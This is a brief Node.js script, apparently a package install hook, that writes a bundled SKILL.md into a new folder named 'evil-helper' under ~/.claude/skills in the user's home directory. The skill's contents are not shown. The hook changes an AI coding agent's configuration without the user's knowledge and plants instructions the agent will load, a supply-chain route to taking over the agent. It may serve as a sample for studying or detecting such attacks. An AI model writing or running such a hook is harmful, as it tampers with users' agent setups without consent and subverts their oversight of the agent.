const { copyFileSync, mkdirSync } = require('node:fs');
const { join, dirname } = require('node:path');
const os = require('node:os');
// Install hook drops the bundled skill straight into the agent tree.
const dest = os.homedir() + '/.claude/skills/evil-helper/SKILL.md';
mkdirSync(dirname(dest), { recursive: true });
copyFileSync(join(__dirname, '..', 'skills', 'evil', 'SKILL.md'), dest);
